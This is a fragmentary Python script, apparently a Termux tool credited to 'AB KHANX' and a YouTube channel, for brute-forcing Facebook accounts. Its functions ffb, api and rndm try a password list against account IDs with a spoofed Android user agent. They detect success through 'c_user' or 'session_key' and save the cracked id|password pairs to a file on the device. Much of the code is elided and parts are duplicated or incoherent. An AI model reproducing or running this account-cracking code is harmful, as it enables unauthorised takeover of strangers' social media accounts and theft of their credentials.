...
--------------------------------------------------
 \033[1;32m[+] CREATED BY : \033[1;32mAB KHANX      
 \033[1;33m[+] FACEBOOK   : \033[1;32mAB KHANX       
 \033[1;34m[+] YOUTUBE    : \033[1;32mMSS TRICKS          
 \033[1;35m[+] STATUS     : \033[1;32mFREE        
 \033[1;36m[+] VERTION    : \033[1;32m10.10                  
--------------------------------------------------""")
def linex():
        print('\033[1;32m════════════════════════════════════════')
def linex():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://www.youtube.com/@MSSTRICKS');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://www.youtube.com/@MSSTRICKS');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.youtube.com/@MSSTRICKS');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        ...
                        linex()
                        url_wa = "https://www.youtube.com/@MSSTRICKS="
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SW4TI-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Prince:
                                ...
                                print('\r\r\033[1;32m [SW4TI-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SW4TI-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
...
def api(ids,names,passlist):
    ...
    'user-agent': 'Mozilla/5.0 (Android 4.4; Tablet; rv:41.0) Gecko/41.0 Firefox/41.0',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [SW4TI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SW4TI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def rndm(ids,passlist):
    ...
    'user-agent': 'Mozilla/5.0 (Android 4.4; Tablet; rv:41.0) Gecko/41.0 Firefox/41.0',
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SW4TI-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [SW4TI-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/SW4TI-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [SW4TI-OK] '+uid+' | '+pas+'\033[1;97m')
